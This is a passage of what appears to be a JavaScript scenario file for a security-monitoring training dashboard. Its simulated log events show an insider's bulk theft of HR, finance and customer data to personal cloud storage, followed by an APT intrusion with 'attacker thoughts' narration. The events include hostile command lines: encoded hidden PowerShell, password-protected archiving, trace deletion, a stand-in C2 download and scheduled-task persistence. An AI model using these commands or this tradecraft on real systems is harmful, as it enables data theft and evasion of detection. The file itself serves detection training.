                    label: 'Access Expansion',
                    delay: 3,
                    transition_text: 'ACCESS EXPANSION',
                    events: [
                        { _time_offset: 320, host: 'SRV-FILE01', sourcetype: 'WinEventLog:Security', EventCode: 4624, src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '10.3.10.20', dest: 'SRV-FILE01', src_user: 'j.miller', user: 'j.miller', logon_type: 3, action: 'success', mitre_technique: 'T1078', mitre_tactic: 'Defense Evasion', severity: 'medium', description: 'j.miller network logon to SRV-FILE01', kill_chain_phase: 'lateral_movement', risk_score: 40, scenario_id: 'op_silent_drift' },
                        { _time_offset: 340, host: 'SRV-FILE01', sourcetype: 'stream:tcp', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '10.3.10.20', dest: '10.3.10.20', dest_port: 445, app: 'smb', bytes_out: 4096, bytes_in: 8192, bytes: 12288, src_user: 'j.miller', user: 'j.miller', share: '\\\\SRV-FILE01\\HR-SENSITIVE$', mitre_technique: 'T1039', mitre_tactic: 'Collection', severity: 'high', description: 'j.miller mounted HR-SENSITIVE share (atypical for sysadmin)', kill_chain_phase: 'collection', risk_score: 70, scenario_id: 'op_silent_drift' },
                        { _time_offset: 380, host: 'SRV-FILE01', sourcetype: 'stream:tcp', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '10.3.10.20', dest: '10.3.10.20', dest_port: 445, app: 'smb', bytes_out: 4096, bytes_in: 8192, bytes: 12288, src_user: 'j.miller', user: 'j.miller', share: '\\\\SRV-FILE01\\FINANCE-EXEC$', mitre_technique: 'T1039', mitre_tactic: 'Collection', severity: 'high', description: 'j.miller mounted FINANCE-EXEC share', kill_chain_phase: 'collection', risk_score: 75, scenario_id: 'op_silent_drift' },
                        { _time_offset: 430, host: 'SRV-FILE01', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'j.miller', user: 'j.miller', process: 'explorer.exe', process_name: 'explorer.exe', target_filename: '\\\\SRV-FILE01\\HR-SENSITIVE$\\employee_master.xlsx', file_name: 'employee_master.xlsx', file_path: '\\\\SRV-FILE01\\HR-SENSITIVE$', mitre_technique: 'T1005', mitre_tactic: 'Collection', severity: 'high', description: 'HR employee_master.xlsx opened/copied by j.miller', kill_chain_phase: 'collection', risk_score: 75, scenario_id: 'op_silent_drift' },
                        { _time_offset: 460, host: 'SRV-FILE01', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'j.miller', user: 'j.miller', process: 'explorer.exe', process_name: 'explorer.exe', target_filename: '\\\\SRV-FILE01\\FINANCE-EXEC$\\board_compensation_2024.xlsx', file_name: 'board_compensation_2024.xlsx', file_path: '\\\\SRV-FILE01\\FINANCE-EXEC$', mitre_technique: 'T1005', mitre_tactic: 'Collection', severity: 'high', description: 'board_compensation_2024.xlsx opened by j.miller', kill_chain_phase: 'collection', risk_score: 80, scenario_id: 'op_silent_drift' },
                        { _time_offset: 500, host: 'SRV-DB01', sourcetype: 'WinEventLog:Security', EventCode: 4624, src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '10.3.10.40', dest: 'SRV-DB01', src_user: 'j.miller', user: 'j.miller', logon_type: 3, action: 'success', mitre_technique: 'T1078', mitre_tactic: 'Defense Evasion', severity: 'medium', description: 'j.miller network logon to SRV-DB01', kill_chain_phase: 'lateral_movement', risk_score: 45, scenario_id: 'op_silent_drift' },
                        { _time_offset: 530, host: 'SRV-DB01', sourcetype: 'stream:mysql', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '10.3.10.40', dest: '10.3.10.40', dest_port: 3306, src_user: 'j.miller', user: 'j.miller', query: 'SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=\'production_crm\'', database: 'production_crm', bytes_out: 256, bytes_in: 8192, bytes: 8448, app: 'mysql', mitre_technique: 'T1213.003', mitre_tactic: 'Collection', severity: 'medium', description: 'Production CRM schema enumeration via mysql', kill_chain_phase: 'discovery', risk_score: 55, scenario_id: 'op_silent_drift' },
                        { _time_offset: 575, host: 'SRV-DB01', sourcetype: 'stream:mysql', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '10.3.10.40', dest: '10.3.10.40', dest_port: 3306, src_user: 'j.miller', user: 'j.miller', query: 'SELECT COUNT(*) FROM customer_pii', database: 'production_crm', bytes_out: 256, bytes_in: 1024, bytes: 1280, app: 'mysql', mitre_technique: 'T1005', mitre_tactic: 'Collection', severity: 'high', description: 'Customer PII row count checked', kill_chain_phase: 'collection', risk_score: 70, scenario_id: 'op_silent_drift' },
                        { _time_offset: 600, host: 'SRV-DB01', sourcetype: 'stream:mysql', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '10.3.10.40', dest: '10.3.10.40', dest_port: 3306, src_user: 'j.miller', user: 'j.miller', query: 'SELECT * FROM customer_pii LIMIT 100000', database: 'production_crm', bytes_out: 256, bytes_in: 41943040, bytes: 41943296, app: 'mysql', mitre_technique: 'T1005', mitre_tactic: 'Collection', severity: 'critical', description: 'Bulk customer_pii pull: 40 MB returned to j.miller', kill_chain_phase: 'collection', risk_score: 90, scenario_id: 'op_silent_drift' },
                        { _time_offset: 640, host: 'SRV-DB01', sourcetype: 'stream:mysql', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '10.3.10.40', dest: '10.3.10.40', dest_port: 3306, src_user: 'j.miller', user: 'j.miller', query: 'SELECT * FROM contracts WHERE status=\'active\'', database: 'production_crm', bytes_out: 256, bytes_in: 73400320, bytes: 73400576, app: 'mysql', mitre_technique: 'T1005', mitre_tactic: 'Collection', severity: 'critical', description: 'Active contracts pulled: 70 MB', kill_chain_phase: 'collection', risk_score: 90, scenario_id: 'op_silent_drift' },
                        { _time_offset: 680, host: 'SRV-FILE01', sourcetype: 'stream:tcp', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '10.3.10.20', dest: '10.3.10.20', dest_port: 445, app: 'smb', bytes_out: 1024, bytes_in: 209715200, bytes: 209716224, src_user: 'j.miller', user: 'j.miller', share: '\\\\SRV-FILE01\\FINANCE-EXEC$', mitre_technique: 'T1039', mitre_tactic: 'Collection', severity: 'critical', description: '200 MB pulled from FINANCE-EXEC share by j.miller', kill_chain_phase: 'collection', risk_score: 90, scenario_id: 'op_silent_drift' },
                        { _time_offset: 700, host: 'SRV-DB01', sourcetype: 'attack_sim:notable', src_user: 'j.miller', user: 'j.miller', mitre_technique: 'T1213', mitre_tactic: 'Collection', severity: 'high', description: 'NOTABLE: Anomalous bulk data access by j.miller', kill_chain_phase: 'collection', risk_score: 85, scenario_id: 'op_silent_drift' },
                        { _time_offset: 720, host: 'SRV-FILE01', sourcetype: 'stream:tcp', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '10.3.10.20', dest: '10.3.10.20', dest_port: 445, app: 'smb', bytes_out: 1024, bytes_in: 104857600, bytes: 104858624, src_user: 'j.miller', user: 'j.miller', share: '\\\\SRV-FILE01\\HR-SENSITIVE$', mitre_technique: 'T1039', mitre_tactic: 'Collection', severity: 'high', description: '100 MB pulled from HR-SENSITIVE share', kill_chain_phase: 'collection', risk_score: 80, scenario_id: 'op_silent_drift' }
                    ]
                },
                // ============================================================
                // Phase 3 - Staging (T+12 to T+20min) -- ~13
                // ============================================================
                {
                    id: 'staging',
                    label: 'Staging',
                    delay: 3,
                    transition_text: 'STAGING',
                    events: [
                        { _time_offset: 740, host: 'WS-JMILLER', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'j.miller', user: 'j.miller', process: 'explorer.exe', process_name: 'explorer.exe', target_filename: 'C:\\Users\\j.miller\\Documents\\notes\\employee_master.xlsx', file_name: 'employee_master.xlsx', file_path: 'C:\\Users\\j.miller\\Documents\\notes', mitre_technique: 'T1074.001', mitre_tactic: 'Collection', severity: 'high', description: 'employee_master.xlsx staged to local user notes folder', kill_chain_phase: 'collection', risk_score: 75, scenario_id: 'op_silent_drift' },
                        { _time_offset: 750, host: 'WS-JMILLER', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'j.miller', user: 'j.miller', process: 'explorer.exe', process_name: 'explorer.exe', target_filename: 'C:\\Users\\j.miller\\Documents\\notes\\board_compensation_2024.xlsx', file_name: 'board_compensation_2024.xlsx', file_path: 'C:\\Users\\j.miller\\Documents\\notes', mitre_technique: 'T1074.001', mitre_tactic: 'Collection', severity: 'high', description: 'board_compensation_2024.xlsx staged locally', kill_chain_phase: 'collection', risk_score: 75, scenario_id: 'op_silent_drift' },
                        { _time_offset: 770, host: 'WS-JMILLER', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'j.miller', user: 'j.miller', process: 'mysql.exe', process_name: 'mysql.exe', target_filename: 'C:\\Users\\j.miller\\Documents\\notes\\customer_pii.csv', file_name: 'customer_pii.csv', file_path: 'C:\\Users\\j.miller\\Documents\\notes', mitre_technique: 'T1074.001', mitre_tactic: 'Collection', severity: 'high', description: 'customer_pii.csv saved from mysql output', kill_chain_phase: 'collection', risk_score: 80, scenario_id: 'op_silent_drift' },
                        { _time_offset: 790, host: 'WS-JMILLER', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'j.miller', user: 'j.miller', process: 'mysql.exe', process_name: 'mysql.exe', target_filename: 'C:\\Users\\j.miller\\Documents\\notes\\contracts.csv', file_name: 'contracts.csv', file_path: 'C:\\Users\\j.miller\\Documents\\notes', mitre_technique: 'T1074.001', mitre_tactic: 'Collection', severity: 'high', description: 'contracts.csv saved from mysql output', kill_chain_phase: 'collection', risk_score: 80, scenario_id: 'op_silent_drift' },
                        { _time_offset: 830, host: 'WS-JMILLER', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'j.miller', user: 'j.miller', process: '7z.exe', process_name: '7z.exe', parent_process: 'explorer.exe', parent_process_name: 'explorer.exe', command_line: '7z.exe a -p"drift2026!" -mhe=on C:\\Users\\j.miller\\Documents\\backup_personal.7z C:\\Users\\j.miller\\Documents\\notes\\', mitre_technique: 'T1560.001', mitre_tactic: 'Collection', severity: 'high', description: '7z archive with password + header encryption created', kill_chain_phase: 'collection', risk_score: 80, scenario_id: 'op_silent_drift' },
                        { _time_offset: 870, host: 'WS-JMILLER', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'j.miller', user: 'j.miller', process: '7z.exe', process_name: '7z.exe', target_filename: 'C:\\Users\\j.miller\\Documents\\backup_personal.7z', file_name: 'backup_personal.7z', file_path: 'C:\\Users\\j.miller\\Documents', mitre_technique: 'T1560.001', mitre_tactic: 'Collection', severity: 'high', description: 'Encrypted archive backup_personal.7z written (218 MB)', kill_chain_phase: 'collection', risk_score: 80, scenario_id: 'op_silent_drift' },
                        { _time_offset: 920, host: 'WS-JMILLER', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'j.miller', user: 'j.miller', process: '7z.exe', process_name: '7z.exe', parent_process: 'explorer.exe', parent_process_name: 'explorer.exe', command_line: '7z.exe a -p"drift2026!" -v25m C:\\Users\\j.miller\\Documents\\backup_personal_split.7z C:\\Users\\j.miller\\Documents\\backup_personal.7z', mitre_technique: 'T1030', mitre_tactic: 'Exfiltration', severity: 'medium', description: 'Archive split into 25MB volumes for slow exfil', kill_chain_phase: 'collection', risk_score: 65, scenario_id: 'op_silent_drift' },
                        { _time_offset: 940, host: 'WS-JMILLER', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'j.miller', user: 'j.miller', process: '7z.exe', process_name: '7z.exe', target_filename: 'C:\\Users\\j.miller\\Documents\\backup_personal_split.7z.001', file_name: 'backup_personal_split.7z.001', file_path: 'C:\\Users\\j.miller\\Documents', mitre_technique: 'T1030', mitre_tactic: 'Exfiltration', severity: 'medium', description: 'Split archive part 001 written', kill_chain_phase: 'collection', risk_score: 60, scenario_id: 'op_silent_drift' },
                        { _time_offset: 945, host: 'WS-JMILLER', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'j.miller', user: 'j.miller', process: '7z.exe', process_name: '7z.exe', target_filename: 'C:\\Users\\j.miller\\Documents\\backup_personal_split.7z.002', file_name: 'backup_personal_split.7z.002', file_path: 'C:\\Users\\j.miller\\Documents', mitre_technique: 'T1030', mitre_tactic: 'Exfiltration', severity: 'medium', description: 'Split archive part 002 written', kill_chain_phase: 'collection', risk_score: 60, scenario_id: 'op_silent_drift' },
                        { _time_offset: 950, host: 'WS-JMILLER', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'j.miller', user: 'j.miller', process: '7z.exe', process_name: '7z.exe', target_filename: 'C:\\Users\\j.miller\\Documents\\backup_personal_split.7z.003', file_name: 'backup_personal_split.7z.003', file_path: 'C:\\Users\\j.miller\\Documents', mitre_technique: 'T1030', mitre_tactic: 'Exfiltration', severity: 'medium', description: 'Split archive part 003 written', kill_chain_phase: 'collection', risk_score: 60, scenario_id: 'op_silent_drift' },
                        { _time_offset: 1000, host: 'WS-JMILLER', sourcetype: 'stream:tcp', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '8.8.8.8', dest: '8.8.8.8', dest_port: 53, app: 'dns', bytes_out: 128, bytes_in: 256, bytes: 384, src_user: 'j.miller', user: 'j.miller', query: 'acme-personal.s3.amazonaws.com', mitre_technique: 'T1071.004', mitre_tactic: 'Command and Control', severity: 'low', description: 'DNS resolution: personal S3 bucket (pre-exfil)', kill_chain_phase: 'discovery', risk_score: 30, scenario_id: 'op_silent_drift' },
                        { _time_offset: 1080, host: 'WS-JMILLER', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'j.miller', user: 'j.miller', process: 'OneDrive.exe', process_name: 'OneDrive.exe', target_filename: 'C:\\Users\\j.miller\\OneDrive - Personal\\sync\\backup_personal.7z', file_name: 'backup_personal.7z', file_path: 'C:\\Users\\j.miller\\OneDrive - Personal\\sync', mitre_technique: 'T1567.002', mitre_tactic: 'Exfiltration', severity: 'high', description: 'Archive copied into personal OneDrive sync folder', kill_chain_phase: 'staging', risk_score: 75, scenario_id: 'op_silent_drift' },
                        { _time_offset: 1100, host: 'WS-JMILLER', sourcetype: 'attack_sim:notable', src_user: 'j.miller', user: 'j.miller', mitre_technique: 'T1560.001', mitre_tactic: 'Collection', severity: 'high', description: 'NOTABLE: Password-protected archive of sensitive files staged', kill_chain_phase: 'collection', risk_score: 80, scenario_id: 'op_silent_drift' }
                    ]
                },
                // ============================================================
                // Phase 4 - Exfiltration (T+20 to T+25min) -- ~14
                // ============================================================
                {
                    id: 'exfiltration',
                    label: 'Cloud Exfiltration',
                    delay: 3,
                    transition_text: 'CLOUD EXFILTRATION',
                    events: [
                        { _time_offset: 1200, host: 'WS-JMILLER', sourcetype: 'stream:http', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '52.216.140.50', dest: '52.216.140.50', dest_port: 443, dest_host: 'acme-personal.s3.amazonaws.com', site: 'acme-personal.s3.amazonaws.com', http_method: 'PUT', url: 'https://acme-personal.s3.amazonaws.com/backups/employee_master.xlsx', uri_path: '/backups/employee_master.xlsx', bytes_out: 41943040, bytes_in: 256, bytes: 41943296, status: 200, app: 'https', src_user: 'j.miller', user: 'j.miller', mitre_technique: 'T1567.002', mitre_tactic: 'Exfiltration', severity: 'critical', description: 'Uploaded employee_master.xlsx (40 MB) to personal S3', kill_chain_phase: 'exfiltration', risk_score: 90, scenario_id: 'op_silent_drift' },
                        { _time_offset: 1240, host: 'WS-JMILLER', sourcetype: 'stream:http', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '52.216.140.50', dest: '52.216.140.50', dest_port: 443, dest_host: 'acme-personal.s3.amazonaws.com', site: 'acme-personal.s3.amazonaws.com', http_method: 'PUT', url: 'https://acme-personal.s3.amazonaws.com/backups/board_compensation_2024.xlsx', uri_path: '/backups/board_compensation_2024.xlsx', bytes_out: 26214400, bytes_in: 256, bytes: 26214656, status: 200, app: 'https', src_user: 'j.miller', user: 'j.miller', mitre_technique: 'T1567.002', mitre_tactic: 'Exfiltration', severity: 'critical', description: 'Uploaded board_compensation_2024.xlsx (25 MB) to S3', kill_chain_phase: 'exfiltration', risk_score: 90, scenario_id: 'op_silent_drift' },
                        { _time_offset: 1280, host: 'WS-JMILLER', sourcetype: 'stream:http', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '162.125.83.7', dest: '162.125.83.7', dest_port: 443, dest_host: 'dropbox-jmiller.dropboxusercontent.com', site: 'dropbox-jmiller.dropboxusercontent.com', http_method: 'POST', url: 'https://dropbox-jmiller.dropboxusercontent.com/upload/customer_pii.csv', uri_path: '/upload/customer_pii.csv', bytes_out: 52428800, bytes_in: 256, bytes: 52429056, status: 200, app: 'https', src_user: 'j.miller', user: 'j.miller', mitre_technique: 'T1567.002', mitre_tactic: 'Exfiltration', severity: 'critical', description: 'Uploaded customer_pii.csv (50 MB) to personal Dropbox', kill_chain_phase: 'exfiltration', risk_score: 95, scenario_id: 'op_silent_drift' },
                        { _time_offset: 1320, host: 'WS-JMILLER', sourcetype: 'stream:http', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '162.125.83.7', dest: '162.125.83.7', dest_port: 443, dest_host: 'dropbox-jmiller.dropboxusercontent.com', site: 'dropbox-jmiller.dropboxusercontent.com', http_method: 'POST', url: 'https://dropbox-jmiller.dropboxusercontent.com/upload/contracts.csv', uri_path: '/upload/contracts.csv', bytes_out: 78643200, bytes_in: 256, bytes: 78643456, status: 200, app: 'https', src_user: 'j.miller', user: 'j.miller', mitre_technique: 'T1567.002', mitre_tactic: 'Exfiltration', severity: 'critical', description: 'Uploaded contracts.csv (75 MB) to personal Dropbox', kill_chain_phase: 'exfiltration', risk_score: 95, scenario_id: 'op_silent_drift' },
                        { _time_offset: 1360, host: 'WS-JMILLER', sourcetype: 'stream:http', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '142.250.65.110', dest: '142.250.65.110', dest_port: 443, dest_host: 'drive.google.com', site: 'drive.google.com', http_method: 'POST', url: 'https://drive.google.com/upload/backup_personal_split.7z.001', uri_path: '/upload/backup_personal_split.7z.001', bytes_out: 26214400, bytes_in: 256, bytes: 26214656, status: 200, app: 'https', src_user: 'j.miller', user: 'j.miller', mitre_technique: 'T1567.002', mitre_tactic: 'Exfiltration', severity: 'critical', description: 'Uploaded archive part .001 (25 MB) to Google Drive', kill_chain_phase: 'exfiltration', risk_score: 92, scenario_id: 'op_silent_drift' },
                        { _time_offset: 1380, host: 'WS-JMILLER', sourcetype: 'stream:http', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '142.250.65.110', dest: '142.250.65.110', dest_port: 443, dest_host: 'drive.google.com', site: 'drive.google.com', http_method: 'POST', url: 'https://drive.google.com/upload/backup_personal_split.7z.002', uri_path: '/upload/backup_personal_split.7z.002', bytes_out: 26214400, bytes_in: 256, bytes: 26214656, status: 200, app: 'https', src_user: 'j.miller', user: 'j.miller', mitre_technique: 'T1567.002', mitre_tactic: 'Exfiltration', severity: 'critical', description: 'Uploaded archive part .002 (25 MB) to Google Drive', kill_chain_phase: 'exfiltration', risk_score: 92, scenario_id: 'op_silent_drift' },
                        { _time_offset: 1400, host: 'WS-JMILLER', sourcetype: 'stream:http', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '142.250.65.110', dest: '142.250.65.110', dest_port: 443, dest_host: 'drive.google.com', site: 'drive.google.com', http_method: 'POST', url: 'https://drive.google.com/upload/backup_personal_split.7z.003', uri_path: '/upload/backup_personal_split.7z.003', bytes_out: 26214400, bytes_in: 256, bytes: 26214656, status: 200, app: 'https', src_user: 'j.miller', user: 'j.miller', mitre_technique: 'T1567.002', mitre_tactic: 'Exfiltration', severity: 'critical', description: 'Uploaded archive part .003 (25 MB) to Google Drive', kill_chain_phase: 'exfiltration', risk_score: 92, scenario_id: 'op_silent_drift' },
                        { _time_offset: 1430, host: 'WS-JMILLER', sourcetype: 'stream:http', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '52.216.140.50', dest: '52.216.140.50', dest_port: 443, dest_host: 'acme-personal.s3.amazonaws.com', site: 'acme-personal.s3.amazonaws.com', http_method: 'PUT', url: 'https://acme-personal.s3.amazonaws.com/backups/finance_dump.csv', uri_path: '/backups/finance_dump.csv', bytes_out: 209715200, bytes_in: 256, bytes: 209715456, status: 200, app: 'https', src_user: 'j.miller', user: 'j.miller', mitre_technique: 'T1567.002', mitre_tactic: 'Exfiltration', severity: 'critical', description: 'Uploaded finance_dump.csv (200 MB) to personal S3', kill_chain_phase: 'exfiltration', risk_score: 95, scenario_id: 'op_silent_drift' },
                        { _time_offset: 1470, host: 'WS-JMILLER', sourcetype: 'stream:http', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '162.125.83.7', dest: '162.125.83.7', dest_port: 443, dest_host: 'dropbox-jmiller.dropboxusercontent.com', site: 'dropbox-jmiller.dropboxusercontent.com', http_method: 'POST', url: 'https://dropbox-jmiller.dropboxusercontent.com/upload/exec_minutes.pdf', uri_path: '/upload/exec_minutes.pdf', bytes_out: 15728640, bytes_in: 256, bytes: 15728896, status: 200, app: 'https', src_user: 'j.miller', user: 'j.miller', mitre_technique: 'T1567.002', mitre_tactic: 'Exfiltration', severity: 'high', description: 'Uploaded exec_minutes.pdf (15 MB) to personal Dropbox', kill_chain_phase: 'exfiltration', risk_score: 85, scenario_id: 'op_silent_drift' },
                        { _time_offset: 1500, host: 'WS-JMILLER', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'j.miller', user: 'j.miller', process: 'cmd.exe', process_name: 'cmd.exe', parent_process: 'explorer.exe', parent_process_name: 'explorer.exe', command_line: 'cmd /c del /f /q C:\\Users\\j.miller\\Documents\\notes\\*', mitre_technique: 'T1070.004', mitre_tactic: 'Defense Evasion', severity: 'medium', description: 'Local staging files deleted', kill_chain_phase: 'defense_evasion', risk_score: 55, scenario_id: 'op_silent_drift' },
                        { _time_offset: 1510, host: 'WS-JMILLER', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'j.miller', user: 'j.miller', process: 'cmd.exe', process_name: 'cmd.exe', parent_process: 'explorer.exe', parent_process_name: 'explorer.exe', command_line: 'cmd /c del /f /q C:\\Users\\j.miller\\Documents\\backup_personal*.7z*', mitre_technique: 'T1070.004', mitre_tactic: 'Defense Evasion', severity: 'medium', description: 'Local archive parts deleted', kill_chain_phase: 'defense_evasion', risk_score: 55, scenario_id: 'op_silent_drift' },
                        { _time_offset: 1520, host: 'WS-JMILLER', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'j.miller', user: 'j.miller', process: 'powershell.exe', process_name: 'powershell.exe', parent_process: 'explorer.exe', parent_process_name: 'explorer.exe', command_line: 'powershell -c "Clear-RecycleBin -Force"', mitre_technique: 'T1070.004', mitre_tactic: 'Defense Evasion', severity: 'low', description: 'Recycle bin emptied', kill_chain_phase: 'defense_evasion', risk_score: 40, scenario_id: 'op_silent_drift' },
                        { _time_offset: 1540, host: 'WS-JMILLER', sourcetype: 'attack_sim:notable', src_user: 'j.miller', user: 'j.miller', mitre_technique: 'T1567.002', mitre_tactic: 'Exfiltration', severity: 'critical', description: 'NOTABLE: 800+ MB exfiltrated to consumer cloud (S3 / Dropbox / Drive)', kill_chain_phase: 'exfiltration', risk_score: 95, scenario_id: 'op_silent_drift' },
                        { _time_offset: 1560, host: 'SRV-DB01', sourcetype: 'attack_sim:notable', src_user: 'j.miller', user: 'j.miller', mitre_technique: 'T1078', mitre_tactic: 'Defense Evasion', severity: 'high', description: 'NOTABLE: Privileged user accessed data outside normal role', kill_chain_phase: 'collection', risk_score: 85, scenario_id: 'op_silent_drift' }
                    ]
                }
            ]
        },

        // ====================================================================
        // OPERATION STILLWATER — realistic 21-day low-and-slow APT espionage.
        // Unlike the compressed scenarios, this one's events are spaced over
        // three real weeks (_time_offset in seconds across 21 days) so the
        // timeline shows genuine nation-state dwell time. index_span_seconds
        // compresses the INDEXED copy into a recent ~2h window so the -24h
        // dashboard panels still populate, while the topology/clock replay the
        // true 21-day narrative.
        // ====================================================================
        'op_stillwater': {
            id: 'op_stillwater',
            attacker_thoughts: [
                { _time_offset: 600, text: 'Spear-phish landed. m.ross opened it. Implant\'s calling home — now we wait.' },
                { _time_offset: 90000, text: 'Persistence set. I\'ll beacon every few hours. No rush. Patience is the whole game.' },
                { _time_offset: 259200, text: 'Day 3. Mapping their Active Directory quietly. Nobody watches LDAP.' },
                { _time_offset: 432000, text: 'SharpHound pulled the entire attack path. SRV-SQL01 is my road to the DC.' },
                { _time_offset: 525600, text: 'Kerberoasted the SQL service account, cracked it overnight. LSASS gave me the rest.' },
                { _time_offset: 777600, text: 'Day 9 — onto SRV-FILE02. Their EDR never blinked. Moving slow keeps me invisible.' },
                { _time_offset: 1123200, text: 'DCSync on DC01. No replication alerting. The whole domain is mine now.' },
                { _time_offset: 1296000, text: 'Staging the engineering and finance archives. A few megabytes at a time.' },
                { _time_offset: 1641600, text: 'Low-and-slow exfil over DNS and HTTPS. Three weeks in and they still have no idea.' },
                { _time_offset: 1810000, text: '210 MB gone. Twenty-one days, zero alerts. This is how you do it quietly.' }
            ],
            name: 'Operation Stillwater',
            subtitle: 'Nation-state espionage — realistic 21-day low-and-slow dwell',
            description: 'A patient APT intrusion played out at true operational tempo: a single spear-phish on day 0, then weeks of quiet — periodic C2 beacons, slow Active Directory reconnaissance, Kerberoasting, and careful lateral movement to the file server, SQL server and domain controller — before a low-and-slow exfiltration of engineering and finance data over the final days. Phases are dated days apart, the way real nation-state operations actually unfold.',
            duration_label: '~21 days (real dwell time)',
            real_world: '21 days — replayed at true tempo',
            target_playback_seconds: 120,
            index_span_seconds: 7200,
            phases: [
                {
                    id: 'initial_access',
                    label: 'Initial Access',
                    delay: 1,
                    transition_text: 'Day 0 — spear-phish lands. One click is all it takes.',
                    events: [
                        { _time_offset: 0, host: 'WS-MROSS', sourcetype: 'WinEventLog:Security', EventCode: 4688, src_user: 'mross', user: 'mross', process: 'OUTLOOK.EXE', process_name: 'OUTLOOK.EXE', parent_process: 'explorer.exe', parent_process_name: 'explorer.exe', command_line: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"', mitre_technique: 'T1566.001', mitre_tactic: 'Initial Access', severity: 'medium', description: 'Spear-phishing email opened by engineer m.ross (lure: "Supplier NDA - signature required")', kill_chain_phase: 'initial_access', risk_score: 45, scenario_id: 'op_stillwater' },
                        { _time_offset: 180, host: 'WS-MROSS', sourcetype: 'WinEventLog:Security', EventCode: 4688, src_user: 'mross', user: 'mross', process: 'powershell.exe', process_name: 'powershell.exe', parent_process: 'WINWORD.EXE', parent_process_name: 'WINWORD.EXE', command_line: 'powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...', mitre_technique: 'T1059.001', mitre_tactic: 'Execution', severity: 'critical', description: 'Encoded PowerShell spawned by Word macro (NDA.docm)', kill_chain_phase: 'execution', risk_score: 80, scenario_id: 'op_stillwater' },
                        { _time_offset: 600, host: 'WS-MROSS', sourcetype: 'stream:http', src_ip: '10.5.2.30', src: '10.5.2.30', dest_ip: '45.131.0.77', dest: '45.131.0.77', dest_port: 443, dest_host: 'apt29-cdn-sync.com', site: 'apt29-cdn-sync.com', http_method: 'GET', url: 'https://apt29-cdn-sync.com/jquery.min.js', uri_path: '/jquery.min.js', bytes_out: 312, bytes_in: 246784, bytes: 247096, status: 200, app: 'https', mitre_technique: 'T1071.001', mitre_tactic: 'Command and Control', severity: 'high', description: 'Second-stage implant retrieved from C2 (apt29-cdn-sync.com)', kill_chain_phase: 'c2', risk_score: 80, scenario_id: 'op_stillwater' },
                        { _time_offset: 3600, host: 'WS-MROSS', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'mross', user: 'mross', process: 'powershell.exe', process_name: 'powershell.exe', target_filename: 'C:\\Users\\mross\\AppData\\Roaming\\Microsoft\\msedgeupdate.dll', file_name: 'msedgeupdate.dll', file_path: 'C:\\Users\\mross\\AppData\\Roaming\\Microsoft', mitre_technique: 'T1105', mitre_tactic: 'Command and Control', severity: 'high', description: 'Implant DLL written to user profile (masquerades as Edge updater)', kill_chain_phase: 'execution', risk_score: 70, scenario_id: 'op_stillwater' }
                    ]
                },
                {
                    id: 'persistence_c2',
                    label: 'Persistence & C2',
                    delay: 3,
                    transition_text: 'Day 1 — they settle in. Persistence planted, beacons every few hours.',
                    events: [
                        { _time_offset: 86400, host: 'WS-MROSS', sourcetype: 'WinEventLog:Security', EventCode: 4698, src_user: 'mross', user: 'mross', task_name: '\\Microsoft\\Windows\\EdgeUpdate\\MicrosoftEdgeUpdateTaskMachineCore', command_line: 'rundll32.exe C:\\Users\\mross\\AppData\\Roaming\\Microsoft\\msedgeupdate.dll,Start', mitre_technique: 'T1053.005', mitre_tactic: 'Persistence', severity: 'high', description: 'Scheduled task created for implant persistence (masquerades as Edge update)', kill_chain_phase: 'persistence', risk_score: 70, scenario_id: 'op_stillwater' },
                        { _time_offset: 90000, host: 'WS-MROSS', sourcetype: 'stream:http', src_ip: '10.5.2.30', src: '10.5.2.30', dest_ip: '45.131.0.77', dest: '45.131.0.77', dest_port: 443, dest_host: 'apt29-cdn-sync.com', site: 'apt29-cdn-sync.com', http_method: 'POST', url: 'https://apt29-cdn-sync.com/telemetry', uri_path: '/telemetry', bytes_out: 480, bytes_in: 512, bytes: 992, status: 200, app: 'https', mitre_technique: 'T1071.001', mitre_tactic: 'Command and Control', severity: 'medium', description: 'C2 beacon check-in (low-frequency, ~4h interval)', kill_chain_phase: 'c2', risk_score: 55, scenario_id: 'op_stillwater' },
